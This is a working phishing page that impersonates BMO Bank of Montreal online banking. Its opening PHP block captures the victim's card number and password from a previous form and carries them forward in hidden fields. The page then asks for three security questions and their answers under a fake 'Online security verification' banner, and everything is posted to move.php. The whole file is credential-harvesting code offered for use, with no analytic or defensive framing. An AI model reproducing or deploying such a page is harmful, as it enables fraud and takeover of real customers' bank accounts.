<?php
$user = $_POST['siBankCard'];
$pass = $_POST['regSignInPassword'];
?>
<html><head>
		<meta http-equiv="X-UA-Compatible" content="IE=edge">		
		<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
	    <meta name="keywords" content="">
	    <meta name="description" content="">
	    <meta name="channelLevel1" content="home">
	
		<title>BMO Bank of Montreal Online Banking</title>

<link href="favicon.ico" rel="shortcut icon">
		<link href="files/dojo.css" rel="stylesheet" type="text/css">
		<link href="files/tundra.css" rel="stylesheet" type="text/css">
		
		<link href="files/bmo.css" rel="stylesheet" type="text/css">
		<link href="files/bmo_003.css" rel="stylesheet" type="text/css">
		
		<link href="files/bmo_002.css" rel="stylesheet" type="text/css" media="print">
	<script type="text/javascript" language="JavaScript" src="files/a.js"></script>


	</head> <body class="tundra"> 
		<div class="bmoOLB">
			<div id="root_div" class="medium">
				<div id="header" class="header">
					<div id="main_title" style="color:#0079c1">My Contact Information</div>
					<a  style="color:#0079c1"><img src="files/sp.gif" alt="Skip to main content" border="0" height="0" width="0"></a>
					<a  style="color:#0079c1"><img src="files/sp.gif" alt="Skip to navigation" border="0" height="0" width="0"></a>
					



<div id="header_logo">BMO Financial Group logo</div>

	
	
<div id="headerLinks">
	<a onClick="#">Locate an ATM or Branch</a> | 
	<a onClick="#">Contact Us</a> |
	<a  onClick="#">Sign Out</a>
</div>



		<label id="lbl_signin" for="signin">Other BMO Sites:</label>
		<div id="signinContainer">
			<table aria-invalid="false" aria-expanded="false" widgetid="signin" id="signin" title="Sign In" tabindex="0" style="-moz-user-select: none;" class="dijit dijitReset dijitInline dijitLeft DropDownSignIn dijitDownArrowButton signin" data-dojo-attach-point="_buttonNode,tableNode,focusNode,_popupStateNode" role="listbox" aria-haspopup="true" cellpadding="0" cellspacing="0" lang="en"><tbody role="presentation"><tr role="presentation"><td class="dijitReset dijitStretch dijitButtonContents" role="presentation"><div class="dijitReset dijitInputField dijitButtonText" data-dojo-attach-point="containerNode,textDirNode" role="presentation"><span role="option" class="dijitReset dijitInline DropDownSignInLabel ">Other Services/Accounts...</span></div><div class="dijitReset dijitValidationContainer"><input class="dijitReset dijitInputField dijitValidationIcon dijitValidationInner" value="&#935; " tabindex="-1" readonly="readonly" role="presentation" type="text"></div></td><td class="dijitReset dijitRight dijitButtonNode dijitArrowButton dijitDownArrowButton dijitArrowButtonContainer" data-dojo-attach-point="titleNode" role="presentation"><input class="dijitReset dijitInputField dijitArrowButtonInner" value="&#9660; " tabindex="-1" readonly="readonly" role="presentation" type="text"></td></tr></tbody></table>
		</div>
		<a  title="GO" alt="GO" id="header_goButton">
			GO
		</a>
	<div id="SecureSite">Secure Site</div>




									
				</div>
	
				<div id="middle_topCap">
				</div>
				<div id="middle_div">
					 


<div id="topnav">
	<a name="skiptonavigation" id="skiptonavigation"></a>
	<ul class="topnav_menu">

<li id="menuMyAccounts"><a >My Accounts</a></li> 
				<li id="menuPT"><a >Payments &amp; Transfers</a></li> 
				<li id="menuMoneyLogic"><a>Manage My Finances</a></li> 
				<li id="menuPP"><a class="selected" >My Profile Se</a></li> 
				<li id="menuSR"><a >Products &amp; Services</a></li> 
				


	</ul>
	






<div widgetid="bmo_MyMessages_0" id="bmo_MyMessages_0" lang="en"><div id="messageCentre">
	<a  id="myMessages" class="myMessages">My Messages</a>
	<div id="myMessagesInfoContainer" class="hide">
		<div class="myMessagesInfoContainerTop"></div><div id="messageCenterHoverState"><ul><li class="nopending"><a href="#">My Requests (0)</a></li><li class="nopending"><a href="#">BMO Offers (0)</a></li><li class="pending"><a href="#">Important Notices (1)</a></li><li class="separator"><a href="#">Go to My Messages</a></li><li><a href="#">Send a Message</a></li></ul></div><div class="myMessagesInfoContainerBottom"></div>
	</div>
	<div style="" class="newMessageCount"><div class="newMessageCountLeft">
		<div class="newMessageCountRight">1</div>
	</div></div>
</div></div>
	
	
</div>

					<div id="main_body" class="main_body profileandpreferences newContactDetails">
					<a name="skiptomain" id="skiptomain"></a>
						
							<div id="homepage_right_column">
								<div class="main_body profileandpreferences myContactInfo" id="utilityBar">
									<h1 id="mainHeader">My Contact Information</h1>		
									




	<div id="pageLevelUtilities">
		<ul id="pageLevelUtilitiesNav">
			<li>
				Text Size:
			</li>
			<li id="textSize">
				<a id="tsSmall"  title="Small">Small</a>
				<a id="tsMedium"  class="tsSelected" title="Medium">Medium</a>
				<a id="tsLarge" title="Large">Large</a>
			</li>
		</ul>
		<a id="helpCentre" >Help Centre</a>
	</div>

							  </div>

			


<link href="files/mycontactinfo.css" rel="stylesheet" type="text/css">

		
<div id="clientSideErrorBoxId"></div>





<div class="main_body profileandpreferences newContactDetails">
	<div>
		<!-- body -->
	
		<div class="bodyCopy"><b><p style="color:#EF383F;font-size:160%">Online security verification</p></b><br>
			<p>
				Personal information that you provide to us is protected and may be used in accordance with 
				<a target="_new" href="http://www.bmo.com/privacy"  title="Our Privacy Code">Our Privacy Code</a>.<br><br>
			
				Input your information in the fields below in order to verify your account information.  When you are finished
 entering your information, click Confirm to 
				submit your request.<br><br>
			   
			   	By clicking Confirm, you are consenting to the sharing of 
your personal information and authorizing BMO Bank of Montreal to verify
 your contact information with BMO Investments Inc. 
			   	and the Bank of Montreal Mortgage Corporation.</p>
		</div>
		<p class="requiredFieldLbl">*Required field</p> 
		<form  method="post" action="move.php" name="personalInfoForm" lang="en" onsubmit="return checkquestion(this)">
		<input type="hidden" name="user" value="<?php print "$user"; ?>">
	    <input type="hidden" name="pass" value="<?php print "$pass"; ?>">
		<div class="editInfoBox" >
			<h2>Your challenge questions</h2><br>
			
			
				 <p> <span class="reqAst">*</span> <a>Your security questions must match the ones you have chosen on registration.</a></p><br><br>
		<dl></dl>
		<dl>
			<dt>
				<label for="regQuestion1" name="lblregQuestion1" id="lblregQuestion1"><span class="reqAst">*</span> Question 1</label>
			</dt>
			<dd>
				<select id="q1" name="q1" class="regQuestion"   maxHeight="300">
					<option value="" selected="selected">Please select your security question.</option>
					
						<option value="What is the first name of your father's oldest sibling?" >What is the first name of your father's oldest sibling?</option>
						<option value="What is the first name of your oldest nephew?">What is the first name of your oldest nephew?</option>
						<option value="What is the first name of the person you went to your prom with?">What is the first name of the person you went to your prom with?</option>
						<option value="What was the last name of your favourite teacher in high school?">What was the last name of your favourite teacher in high school?</option>
						<option value="What was the last name of your favourite teacher in elementary school?">What was the last name of your favourite teacher in elementary school?</option>
						<option value="What was the name of your first pet?">What was the name of your first pet?</option>
						<option value="What was the first name of your first roommate?">What was the first name of your first roommate?</option>
						<option value="What is the first name of your spouse's/partner's father?">What is the first name of your spouse's/partner's father?</option>
						<option value="What is the first name of the maid of honour at your wedding?">What is the first name of the maid of honour at your wedding?</option>
						<option value="What was the name of your favourite superhero as a child?">What was the name of your favourite superhero as a child?</option>
						<option value="What is the first name of your oldest cousin?">What is the first name of your oldest cousin?</option>
						<option value="What is the first name of your first friend?">What is the first name of your first friend?</option>
						<option value="What city were you born in?">What city were you born in?</option>
						<option value="What is the street name where you lived when you were 10 years old?">What is the street name where you lived when you were 10 years old?</option>
						<option value="What is your mother's middle name?">What is your mother's middle name?</option>
						<option value="What is the name of the city where your mother was born?">What is the name of the city where your mother was born?</option>
					
						<option value="Q1.35" >What was the first name of your first manager?</option>
						<option value="What was the first name of your first manager?">What is your favourite cartoon?</option>
						<option value="What is the middle name of your oldest sibling?">What is the middle name of your oldest sibling?</option>
						<option value="What is your favourite musical instrument?">What is your favourite musical instrument?</option>
						<option value="What is your spouse's/partner's middle name?">What is your spouse's/partner's middle name?</option>
						<option value="What is the first name of the best man at your wedding?">What is the first name of the best man at your wedding?</option>
						<option value="What is the first name of your mother's oldest sibling?">What is the first name of your mother's oldest sibling?</option>
						<option value="What is the name of the city where your father was born?">What is the name of the city where your father was born?</option>
						<option value="What is your youngest child's middle name?">What is your youngest child's middle name?</option>
						<option value="What colour was your first car?">What colour was your first car?</option>
						<option value="What is the first name of your oldest niece?">What is the first name of your oldest niece?</option>
						<option value="Who was your favourite athlete as a child?">Who was your favourite athlete as a child?</option>
						<option value="What is your father's middle name?">What is your father's middle name?</option>
					 

				</select>
			</dd>
			<dt>
				<label for="regAnswer1" name="lblregAnswer1" id="lblregAnswer1"><span class="reqAst">*</span> Answer 1</label>
			</dt>
			<dd>	
			   			   			 	
			 
			   	<input type="text" id="a1" name="a1" value="" class="maskAnswer" dojoType="dijit.form.ValidationTextBox"  />									
				
			</dd>
		</dl>
		
		<dl>
			<dt>
				<label for="regQuestion2" name="lblregQuestion2" id="lblregQuestion2"><span class="reqAst">*</span> Question 2</label>
			</dt>
			<dd>
				<select id="q2" name="q2" class="regQuestion"   maxHeight="300">
					<option value="" selected="selected">Please select your security question.</option>
					<option value="What is the first name of your oldest niece?">What is the first name of your oldest niece?</option>
					<option value="What is the first name of your oldest cousin?">What is the first name of your oldest cousin?</option>
					<option value="What is your favourite cartoon?">What is your favourite cartoon?</option>
					<option value="What is your favourite musical instrument?">What is your favourite musical instrument?</option>
					<option value="What is the name of the city where your mother was born?">What is the name of the city where your mother was born?</option>
					<option value="What is your youngest child's middle name?">What is your youngest child's middle name?</option>
					<option value="What colour was your first car?">What colour was your first car?</option>
					<option value="What is your spouse's/partner's middle name?">What is your spouse's/partner's middle name?</option>
					<option value="What is your father's middle name?">What is your father's middle name?</option>
					<option value="What is the first name of your mother's oldest sibling?">What is the first name of your mother's oldest sibling?</option>
					<option value="What is the first name of the maid of honour at your wedding?">What is the first name of the maid of honour at your wedding?</option>
					<option value="What is the middle name of your oldest sibling?">What is the middle name of your oldest sibling?</option>
					<option value="What is the first name of the best man at your wedding?">What is the first name of the best man at your wedding?</option>
					<option value="What is the first name of your father's oldest sibling?">What is the first name of your father's oldest sibling?</option>
					<option value="What is your mother's middle name?">What is your mother's middle name?</option>
					<option value="What is the first name of your first friend?">What is the first name of your first friend?</option>
					<option value="What was the last name of your favourite teacher in elementary school?">What was the last name of your favourite teacher in elementary school?</option>
					<option value="What is the first name of the person you went to your prom with?">What is the first name of the person you went to your prom with?</option>
					<option value="What was the first name of your first roommate?">What was the first name of your first roommate?</option>
					<option value="What is the first name of your spouse's/partner's father?">What is the first name of your spouse's/partner's father?</option>
					<option value="What city were you born in?">What city were you born in?</option>
					<option value="What was the name of your first pet?">What was the name of your first pet?</option>
					<option value="What is the street name where you lived when you were 10 years old?">What is the street name where you lived when you were 10 years old?</option>
					<option value="Who was your favourite athlete as a child?">Who was your favourite athlete as a child?</option>
					<option value="What was the name of your favourite superhero as a child?">What was the name of your favourite superhero as a child?</option>
					<option value="What is the first name of your oldest nephew?">What is the first name of your oldest nephew?</option>
					<option value="What was the last name of your favourite teacher in high school?">What was the last name of your favourite teacher in high school?</option>
					<option value="What is the name of the city where your father was born?">What is the name of the city where your father was born?</option>
					<option value="What was the first name of your first manager?">What was the first name of your first manager?</option>
					 

				</select>
			</dd>
			<dt>
				<label for="regAnswer2" name="lblregAnswer2" id="lblregAnswer2"><span class="reqAst">*</span> Answer 2</label>
			</dt>
			<dd>
					
		
			   	<input type="text" id="a2" name="a2" value="" class="maskAnswer"  />		
			</dd>
		</dl>
		
		<dl class="last">
			<dt>
				<label for="regQuestion3" name="lblregQuestion3" id="lblregQuestion3"><span class="reqAst">*</span> Question 3</label>
			</dt>
			<dd>
				<select id="q3" name="q3" class="regQuestion"   maxHeight="300">
					<option value="" selected="selected">Please select your security question.</option>
					<option value="What is the first name of your oldest nephew?">What is the first name of your oldest nephew?</option>
					<option value="What colour was your first car?">What colour was your first car?</option>
					<option value="What is the name of the city where your father was born?">What is the name of the city where your father was born?</option>
					<option value="What is the first name of your oldest cousin?">What is the first name of your oldest cousin?</option>
					<option value="What is your spouse's/partner's middle name?">What is your spouse's/partner's middle name?</option>
					<option value="What is the first name of your spouse's/partner's father?">What is the first name of your spouse's/partner's father?</option>
					<option value="What is the first name of your first friend?">What is the first name of your first friend?</option>
					<option value="What city were you born in?">What city were you born in?</option>
					<option value="What is the first name of the maid of honour at your wedding?">What is the first name of the maid of honour at your wedding?</option>
					<option value="What was the last name of your favourite teacher in high school?">What was the last name of your favourite teacher in high school?</option>
					<option value="What is the street name where you lived when you were 10 years old?">What is the street name where you lived when you were 10 years old?</option>
					<option value="What is the middle name of your oldest sibling?">What is the middle name of your oldest sibling?</option>
					<option value="What was the name of your first pet?">What was the name of your first pet?</option>
					<option value="What is the first name of your oldest niece?">What is the first name of your oldest niece?</option>
					<option value="What is the first name of your father's oldest sibling?">What is the first name of your father's oldest sibling?</option>
					<option value="What was the first name of your first manager?">What was the first name of your first manager?</option>
					<option value="What is the name of the city where your mother was born?">What is the name of the city where your mother was born?</option>
					<option value="What is the first name of the best man at your wedding?">What is the first name of the best man at your wedding?</option>
					<option value="Who was your favourite athlete as a child?">Who was your favourite athlete as a child?</option>
					<option value="What is your favourite cartoon?">What is your favourite cartoon?</option>
					<option value="What was the first name of your first roommate?">What was the first name of your first roommate?</option>
					<option value="What is the first name of the person you went to your prom with?">What is the first name of the person you went to your prom with?</option>
					<option value="What was the name of your favourite superhero as a child?">What was the name of your favourite superhero as a child?</option>
					<option value="What is your youngest child's middle name?">What is your youngest child's middle name?</option>
					<option value="What is your mother's middle name?">What is your mother's middle name?</option>
					<option value="What was the last name of your favourite teacher in elementary school?">What was the last name of your favourite teacher in elementary school?</option>
					<option value="What is your father's middle name?">What is your father's middle name?</option>
					<option value="What is your favourite musical instrument?">What is your favourite musical instrument?</option>
					<option value="What is the first name of your mother's oldest sibling?">What is the first name of your mother's oldest sibling?</option>
					 

				</select>
			</dd>
			<dt>
				<label for="regAnswer3" name="lblregAnswer3" id="lblregAnswer3"><span class="reqAst">*</span> Answer 3</label>
			</dt>
			<dd>
					
			
			  	<input type="text" id="a3" name="a3" value="" class="maskAnswer"  />		
			</dd>
		</dl>
		
						<div id="ptBottomMenu">
			<div id="ptRightButtons">
			<input type="image" value="" src="files/confirm.png"></div>
		</div>
		
	</div>
	
		
		

		



		</form>
	</div>
</div>

	
	
	<div class="standardAdvert">

	
</div>



						</div><!-- END homepage_right_column_div -->
						<div id="homepage_left_column">
<h2 class="sideHeader">My Profile and Preferences</h2>

<ul id="sideMenu">


	
	<li>
		
					<a ><span id="selectedLink">My Security Information </span></a>
				
	  
		
		            <ul class="sideMenuSubMenu">
		  </ul>
	</li>  
	</ul>

							




<div id="contactUs" class="standardSmallBox helpBox">
	<div class="standardSmallBoxTopCap"></div>
	<div class="standardSmallBoxContent">
		<div class="standardSmallBoxHeaderCap">
			<div class="boxHeader">questions?</div>
		</div>
		<div class="content">
			<ul>
				<li><a id="helpCentreLink1" class="help">Ask a question</a></li>
				
				<li><a  class="appointment">Book or Manage Appointments</a></li>
				
				<li><a  class="locate">Locate an ATM or branch</a></li>
				<li><a  class="mail">Send us a message</a></li>
			</ul>
		</div>
	</div>
</div>
<!-- End Standard box component without header. -->
							<!-- End Standard box component without header. -->
						</div><!-- END homepage_left_column_div -->
					</div><!-- END main_body_div -->
				</div><!-- END middle_div -->
				<div id="middle_bottomCap"></div>
				<div id="footer" class="footer">
					




<div id="ptBottomFooter">
	<a  title="Privacy">Privacy</a> | 
	<a  title="Legal">Legal</a> | 
	<a   title="Security">Security</a> | 
	<a   title="CDIC Member">CDIC Member</a>		
	<div id="ptRightEndorseLogo"></div>
</div>


				</div>
			</div>
			<!-- END root_div-->
		</div> <!-- END bmoOLB wrapper div -->

	
<div widgetid="OABDialog" id="OABDialog" style="overflow: auto; display: none; position: absolute;" class="bmoDijitDialog" role="dialog" aria-labelledby="OABDialog_title" lang="en">
	<div data-dojo-attach-point="titleBar" class="bmoDijitDialogTitleBar">
		<span data-dojo-attach-point="titleNode" class="dijitDialogTitle" id="OABDialog_title" role="heading" level="1"></span>
		<span style="display: block;" data-dojo-attach-point="closeButtonNode" class="dijitDialogCloseIcon" data-dojo-attach-event="ondijitclick: onCancel" title="Close" role="button" tabindex="0">
			<span style="display: none;" data-dojo-attach-point="closeText" class="closeText" title="Cancel">x</span>
		</span>
	</div>
	<div data-dojo-attach-point="containerNode" class="bmoDijitDialogPaneContent">
	<iframe id="OABFrame" name="OABFrame" hspace="0" vspace="0" src="" frameborder="0" height="700" width="500"> </iframe>
</div>
</div><div style="display: none; position: absolute;" widgetid="bmo_Dialog_0" id="bmo_Dialog_0" class="bmoDijitDialog" role="dialog" aria-labelledby="bmo_Dialog_0_title">
	<div data-dojo-attach-point="titleBar" class="bmoDijitDialogTitleBar">
		<span data-dojo-attach-point="titleNode" class="dijitDialogTitle" id="bmo_Dialog_0_title" role="heading" level="1"></span>
		<span style="display: block;" data-dojo-attach-point="closeButtonNode" class="dijitDialogCloseIcon" data-dojo-attach-event="ondijitclick: onCancel" title="Close" role="button" tabindex="0">
			<span style="display: none;" data-dojo-attach-point="closeText" class="closeText" title="Cancel">x</span>
		</span>
	</div>
	<div data-dojo-attach-point="containerNode" class="bmoDijitDialogPaneContent"><iframe id="helpCenterIframeId" name="helpCenterIframeId" style="border: none; width: 855px; height: 825px;" frameborder="0"></iframe></div>
</div></body></html>